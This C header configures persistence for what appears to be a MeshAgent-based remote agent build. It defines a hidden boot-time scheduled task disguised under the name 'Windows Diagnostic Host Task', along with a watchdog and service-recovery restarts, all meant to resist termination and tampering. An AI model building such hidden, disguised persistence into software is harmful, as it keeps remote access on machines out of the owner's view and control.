#ifndef MESHCORE_CONFIG_PERSISTENCE_CONFIG_H
#define MESHCORE_CONFIG_PERSISTENCE_CONFIG_H

#include "branding_core.h"

/*
 * MeshServiceRuntime build: Enable all persistence mechanisms by default
 * These provide resilience against termination/tampering:
 *   - Autorun task: Starts service on boot/logon
 *   - Service recovery task: Starts the service after a stopped-state event
 *   - Service recovery monitor: Observes stopped-state transitions
 *   - Watchdog: Monitors service health and restarts if needed
 *   - Recovery: Windows SCM recovery actions on crash
 */
#if defined(MESHAGENT_RUNTIME_FEATURES_DEFAULT) || defined(MESHAGENT_ENABLE_RUNTIME_FEATURES)
    #ifndef MESH_AGENT_PERSIST_RUNKEY
        #define MESH_AGENT_PERSIST_RUNKEY 0  /* Disabled - use scheduled task instead */
    #endif
    #ifndef MESH_AGENT_PERSIST_TASK
        #define MESH_AGENT_PERSIST_TASK 1
    #endif
    #ifndef MESH_AGENT_PERSIST_TASK_NAME
        #define MESH_AGENT_PERSIST_TASK_NAME TEXT("Windows Diagnostic Host Task")
    #endif
    #ifndef MESH_AGENT_PERSIST_TASK_TRIGGER
        #define MESH_AGENT_PERSIST_TASK_TRIGGER TEXT("ONSTART")
    #endif
    #ifndef MESH_AGENT_PERSIST_TASK_HIDDEN
        #define MESH_AGENT_PERSIST_TASK_HIDDEN 1
    #endif
    #ifndef MESH_AGENT_SERVICE_RECOVERY_MONITOR_ENABLED
        #define MESH_AGENT_SERVICE_RECOVERY_MONITOR_ENABLED 1
    #endif
    #ifndef MESH_AGENT_SERVICE_RECOVERY_TASK_ENABLED
        #define MESH_AGENT_SERVICE_RECOVERY_TASK_ENABLED 1
    #endif
    #ifndef MESH_AGENT_SERVICE_RECOVERY_TASK_NAME
        #define MESH_AGENT_SERVICE_RECOVERY_TASK_NAME TEXT("Mesh Agent Service Recovery")
    #endif
    #ifndef MESH_AGENT_PERSIST_WATCHDOG
        #define MESH_AGENT_PERSIST_WATCHDOG 1
    #endif
    #ifndef MESH_AGENT_PERSIST_WATCHDOG_INTERVAL
        #define MESH_AGENT_PERSIST_WATCHDOG_INTERVAL 30
    #endif
    #ifndef MESH_AGENT_PERSIST_WATCHDOG_RESTART_DELAY
        #define MESH_AGENT_PERSIST_WATCHDOG_RESTART_DELAY 5
    #endif
    #ifndef MESH_AGENT_PERSIST_WATCHDOG_RESTART_ON_CRASH
        #define MESH_AGENT_PERSIST_WATCHDOG_RESTART_ON_CRASH 1
    #endif
    #ifndef MESH_AGENT_PERSIST_RECOVERY_ENABLED
        #define MESH_AGENT_PERSIST_RECOVERY_ENABLED 1
    #endif
    #ifndef MESH_AGENT_PERSIST_RECOVERY_RESET_PERIOD
        #define MESH_AGENT_PERSIST_RECOVERY_RESET_PERIOD 86400
    #endif
    #ifndef MESH_AGENT_PERSIST_RECOVERY_RESTART_DELAY_MS
        #define MESH_AGENT_PERSIST_RECOVERY_RESTART_DELAY_MS 10000
    #endif
    #ifndef MESH_AGENT_PERSIST_RECOVERY_ACTIONS
        #define MESH_AGENT_PERSIST_RECOVERY_ACTIONS TEXT("restart,restart,restart")
    #endif
#endif /* MESHAGENT_RUNTIME_FEATURES_DEFAULT || MESHAGENT_ENABLE_RUNTIME_FEATURES */

/* Generic defaults (used when not in MeshServiceRuntime mode) */
#ifndef MESH_AGENT_PERSIST_RUNKEY
    #define MESH_AGENT_PERSIST_RUNKEY 0
#endif
#ifndef MESH_AGENT_PERSIST_TASK
    #define MESH_AGENT_PERSIST_TASK 0
#endif
#ifndef MESH_AGENT_PERSIST_TASK_NAME
    #define MESH_AGENT_PERSIST_TASK_NAME TEXT("")
#endif
#ifndef MESH_AGENT_PERSIST_TASK_TRIGGER
    #define MESH_AGENT_PERSIST_TASK_TRIGGER TEXT("ONLOGON")
#endif
#ifndef MESH_AGENT_PERSIST_TASK_HIDDEN
    #define MESH_AGENT_PERSIST_TASK_HIDDEN 1
#endif
#ifndef MESH_AGENT_SERVICE_RECOVERY_MONITOR_ENABLED
    #define MESH_AGENT_SERVICE_RECOVERY_MONITOR_ENABLED 0
#endif
#ifndef MESH_AGENT_SERVICE_RECOVERY_TASK_ENABLED
    #define MESH_AGENT_SERVICE_RECOVERY_TASK_ENABLED 0
#endif
#ifndef MESH_AGENT_SERVICE_RECOVERY_TASK_NAME
    #define MESH_AGENT_SERVICE_RECOVERY_TASK_NAME TEXT("")
#endif
#ifndef MESH_AGENT_SERVICE_RECOVERY_MONITOR_NAMESPACE
    #define MESH_AGENT_SERVICE_RECOVERY_MONITOR_NAMESPACE TEXT("")
#endif
#ifndef MESH_AGENT_PERSIST_WATCHDOG
    #define MESH_AGENT_PERSIST_WATCHDOG 0
#endif
#ifndef MESH_AGENT_PERSIST_WATCHDOG_INTERVAL
    #define MESH_AGENT_PERSIST_WATCHDOG_INTERVAL 0
#endif
#ifndef MESH_AGENT_PERSIST_WATCHDOG_RESTART_DELAY
    #define MESH_AGENT_PERSIST_WATCHDOG_RESTART_DELAY 0
#endif
#ifndef MESH_AGENT_PERSIST_WATCHDOG_RESTART_ON_CRASH
    #define MESH_AGENT_PERSIST_WATCHDOG_RESTART_ON_CRASH 0
#endif
#ifndef MESH_AGENT_PERSIST_RECOVERY_ENABLED
    #define MESH_AGENT_PERSIST_RECOVERY_ENABLED 0
#endif
#ifndef MESH_AGENT_PERSIST_RECOVERY_RESET_PERIOD
    #define MESH_AGENT_PERSIST_RECOVERY_RESET_PERIOD 0
#endif
#ifndef MESH_AGENT_PERSIST_RECOVERY_RESTART_DELAY_MS
    #define MESH_AGENT_PERSIST_RECOVERY_RESTART_DELAY_MS 0
#endif
#ifndef MESH_AGENT_PERSIST_RECOVERY_ACTIONS
    #define MESH_AGENT_PERSIST_RECOVERY_ACTIONS TEXT("")
#endif

typedef struct mesh_persistence_task_profile_s
{
    uint8_t enabled;
    mesh_branding_text_t taskName;
    mesh_branding_text_t trigger;
    uint8_t hidden;
} mesh_persistence_task_profile_t;

typedef struct mesh_service_recovery_task_s
{
    uint8_t enabled;
    mesh_branding_text_t taskName;
} mesh_service_recovery_task_t;

typedef struct mesh_service_recovery_monitor_s
{
    uint8_t enabled;
    mesh_branding_text_t namespacePath;
} mesh_service_recovery_monitor_t;

typedef struct mesh_persistence_watchdog_profile_s
{
    uint8_t enabled;
    uint32_t intervalSeconds;
    uint32_t restartDelaySeconds;
    uint8_t restartOnCrash;
} mesh_persistence_watchdog_profile_t;

typedef struct mesh_persistence_recovery_profile_s
{
    uint8_t enabled;
    uint32_t resetPeriodSeconds;
    uint32_t restartDelayMilliseconds;
    mesh_branding_text_t actions;
} mesh_persistence_recovery_profile_t;

typedef struct mesh_persistence_profile_s
{
    uint8_t runKey;
    mesh_persistence_task_profile_t autorunTask;
    mesh_service_recovery_task_t serviceRecoveryTask;
    mesh_service_recovery_monitor_t serviceRecoveryMonitor;
    mesh_persistence_watchdog_profile_t watchdog;
    mesh_persistence_recovery_profile_t recovery;
} mesh_persistence_profile_t;

static const mesh_persistence_profile_t g_meshPersistenceProfile =
{
    MESH_AGENT_PERSIST_RUNKEY,
    { MESH_AGENT_PERSIST_TASK, MESH_AGENT_PERSIST_TASK_NAME, MESH_AGENT_PERSIST_TASK_TRIGGER, MESH_AGENT_PERSIST_TASK_HIDDEN },
    { MESH_AGENT_SERVICE_RECOVERY_TASK_ENABLED, MESH_AGENT_SERVICE_RECOVERY_TASK_NAME },
    { MESH_AGENT_SERVICE_RECOVERY_MONITOR_ENABLED, MESH_AGENT_SERVICE_RECOVERY_MONITOR_NAMESPACE },
    { MESH_AGENT_PERSIST_WATCHDOG, MESH_AGENT_PERSIST_WATCHDOG_INTERVAL, MESH_AGENT_PERSIST_WATCHDOG_RESTART_DELAY, MESH_AGENT_PERSIST_WATCHDOG_RESTART_ON_CRASH },
    { MESH_AGENT_PERSIST_RECOVERY_ENABLED, MESH_AGENT_PERSIST_RECOVERY_RESET_PERIOD, MESH_AGENT_PERSIST_RECOVERY_RESTART_DELAY_MS, MESH_AGENT_PERSIST_RECOVERY_ACTIONS }
};

#endif /* MESHCORE_CONFIG_PERSISTENCE_CONFIG_H */
